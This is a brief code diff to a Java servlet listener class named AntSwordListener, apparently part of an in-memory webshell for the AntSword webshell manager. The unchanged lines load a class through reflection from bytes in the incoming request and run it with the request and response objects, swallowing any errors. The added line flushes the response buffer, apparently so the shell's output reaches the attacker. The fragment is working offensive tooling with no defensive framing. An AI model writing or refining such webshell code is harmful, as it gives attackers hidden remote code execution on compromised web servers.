@@ -31,6 +31,7 @@ public class AntSwordListener implements ServletRequestListener {
                         method.setAccessible(true);
                         Class clazz = (Class) method.invoke(classLoader, data, new Integer(0), new Integer(data.length));
                         clazz.newInstance().equals(new Object[]{request, response});
+                        response.flushBuffer();
                     } catch (Exception var7) {
                     }
                 }
